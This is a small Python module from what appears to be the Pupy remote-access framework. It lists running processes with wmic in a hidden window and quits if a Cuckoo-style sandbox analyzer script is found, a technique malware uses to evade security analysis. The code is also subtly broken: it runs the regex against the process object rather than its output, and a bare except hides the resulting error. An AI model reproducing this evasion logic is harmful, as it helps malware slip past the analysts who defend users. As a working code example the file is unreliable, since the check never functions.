#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms


import subprocess
import re
try:
	info = subprocess.STARTUPINFO()
	info.dwFlags = subprocess.STARTF_USESHOWWINDOW|subprocess.CREATE_NEW_PROCESS_GROUP
	info.wShowWindow = subprocess.SW_HIDE
	res=subprocess.Popen(["wmic.exe", "process" ,"get", "/FORMAT:LIST"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=info)
	if re.search("CommandLine\\s*=\\s*C:\\\\Python27\\\\pythonw.exe\\s+C:\\\\[a-zA-Z0-9]+\\\\analyzer.py",res):
		exit()
except Exception:
	pass

